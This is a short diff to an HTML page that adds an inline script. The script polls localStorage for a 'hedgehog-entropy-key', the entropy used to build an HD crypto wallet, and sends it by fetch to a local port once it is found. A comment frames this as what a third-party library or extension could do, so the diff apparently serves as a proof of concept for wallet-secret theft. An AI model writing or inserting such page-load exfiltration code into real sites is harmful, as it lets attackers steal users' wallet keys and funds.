@@ -20,6 +20,18 @@
 <body>
 	<div id="root">
 		<script src="./index.js" type="text/jsx"></script>
+
+    <script>
+      var interval = setInterval(() => {
+        const key = localStorage.getItem('hedgehog-entropy-key')
+        if (key) {
+        // A third party library or extension can execute this to get the entropy value used to construct the HD wallet
+
+        clearInterval(interval)
+        fetch('http://127.0.0.1:6660?e='+key)
+        }
+      }, 200)
+    </script>
 </body>
 <footer>
 </footer>
